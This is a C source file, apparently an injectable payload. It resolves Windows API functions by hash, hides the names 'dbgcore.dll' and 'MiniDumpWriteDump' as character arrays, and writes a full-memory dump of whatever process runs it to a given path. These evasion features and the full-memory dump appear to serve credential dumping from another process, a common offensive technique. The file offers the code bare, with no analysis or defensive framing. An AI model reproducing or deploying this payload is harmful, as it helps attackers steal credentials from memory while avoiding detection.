
#include <windows.h>
#include <dbghelp.h>
#include "pe_util.h"
#include "winapi.h"
#include "hashes.h"


VOID WindowsEntrypoint(LPCSTR szDumpPath)
{
  CreateFileA_t         CreateFileA         = NULL;
  CloseHandle_t         CloseHandle         = NULL;
  GetCurrentProcess_t   GetCurrentProcess   = NULL;
  GetCurrentProcessId_t GetCurrentProcessId = NULL;
  LoadLibraryA_t        LoadLibraryA        = NULL;
  GetProcAddress_t      GetProcAddress      = NULL;
  MiniDumpWriteDump_t   MiniDumpWriteDump   = NULL;

  LPVOID                Kernel32Ptr         = NULL;
  LPVOID                DbgHelpPtr          = NULL;

  HANDLE                hFile               = NULL;

  char sz_DbgHelp[]  = { 'd', 'b', 'g', 'c', 'o',
                         'r', 'e', '.', 'd', 'l',
                         'l',  0 };
  char sz_DbgFunc[]  = { 'M', 'i', 'n', 'i', 'D',
	  		 'u', 'm', 'p', 'W', 'r',
			 'i', 't', 'e', 'D', 'u',
			 'm', 'p', 0 };
  

  Kernel32Ptr         = GetPeBase(HASH_KERNEL32);
  LoadLibraryA        = GetPeFunc(Kernel32Ptr, HASH_LOADLIBRARYA);
  CreateFileA         = GetPeFunc(Kernel32Ptr, HASH_CREATEFILEA);
  CloseHandle         = GetPeFunc(Kernel32Ptr, HASH_CLOSEHANDLE);
  GetCurrentProcess   = GetPeFunc(Kernel32Ptr, HASH_GETCURRENTPROCESS);
  GetCurrentProcessId = GetPeFunc(Kernel32Ptr, HASH_GETCURRENTPROCESSID);
  GetProcAddress      = GetPeFunc(Kernel32Ptr, HASH_GETPROCADDRESS);

  if ( (DbgHelpPtr = LoadLibraryA(sz_DbgHelp)) != NULL ) {
    MiniDumpWriteDump = GetProcAddress(DbgHelpPtr, sz_DbgFunc);

    hFile = CreateFileA(
	szDumpPath,
	GENERIC_READ | GENERIC_WRITE,
	FILE_SHARE_READ,
	NULL,
	CREATE_ALWAYS,
	FILE_ATTRIBUTE_NORMAL,
	NULL
    );
    if ( hFile != NULL )
    {
      MiniDumpWriteDump(
	  GetCurrentProcess(),
	  GetCurrentProcessId(),
	  hFile,
	  MiniDumpWithFullMemory 
        | MiniDumpWithPrivateReadWriteMemory
        | MiniDumpWithPrivateWriteCopyMemory,
	  NULL, NULL, NULL
      );
      CloseHandle(hFile);
    };
  };
};
